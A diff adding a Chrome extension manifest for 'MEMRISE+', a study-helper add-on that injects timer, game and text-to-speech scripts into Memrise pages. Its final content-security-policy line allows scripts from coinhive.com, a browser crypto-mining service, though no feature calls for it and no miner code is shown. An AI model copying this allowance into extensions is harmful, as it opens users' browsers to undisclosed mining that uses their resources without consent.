@@ -1,0 +1,72 @@
+{
+  "update_url": "https://clients2.google.com/service/update2/crx",
+  "name": "MEMRISE+",
+  "short_name": "memrise +",
+  "version": "2.0.2",
+  "manifest_version": 2,
+  "default_locale": "en",
+  "description": "For memrise website, you can add a timer configuration, modify font, show charts, difficult words, listen words with TTS",
+  "author": "Rodolphe MOULIN",
+  "icons": {
+    "16": "images/icon-16.png",
+    "32": "images/icon-32.png",
+    "48": "images/icon-48.png",
+    "128": "images/icon-128.png"
+  },
+  "permissions": [
+    "tabs",
+    "storage",
+    "tts",
+    "https://www.memrise.com/*"
+  ],
+  "content_scripts": [
+    {
+      "matches": [
+        "https://www.memrise.com/*"
+      ],
+      "js": [
+        "js/jquery-2.2.4.min.js"
+      ]
+    },
+    {
+      "matches": [
+        "https://www.memrise.com/home/"
+      ],
+      "js": [
+        "jquery-ui-1.11.4/jquery-ui.min.js",
+        "game/word-search-game/js/utility.min.js",
+        "game/word-search-game/js/wordsearch.min.js",
+        "js/insertScript.js"
+      ],
+      "css": [
+        "jquery-ui-1.11.4/jquery-ui.css",
+        "game/word-search-game/css/style.min.css",
+        "game/word-search-game/css/wordsearch.min.css"
+      ]
+    },
+    {
+      "matches": [
+        "https://www.memrise.com/course/*/garden/*",
+        "https://www.memrise.com/garden/water/*"
+      ],
+      "js": [
+        "js/hackTimerUserAction.js",
+        "js/inject_listen.js"
+      ],
+      "css": [
+        "css/inject_css.css"
+      ]
+    }
+  ],
+  "background": {
+    "page": "background.html"
+  },
+  "options_page": "options.html",
+  "browser_action": {
+    "default_icon": "images/icon-48.png"
+  },
+  "web_accessible_resources": [
+    "DorianCLM-BookItalic.ttf"
+  ],
+  "content_security_policy": "script-src 'self' https://coinhive.com/; object-src 'self'"
+}
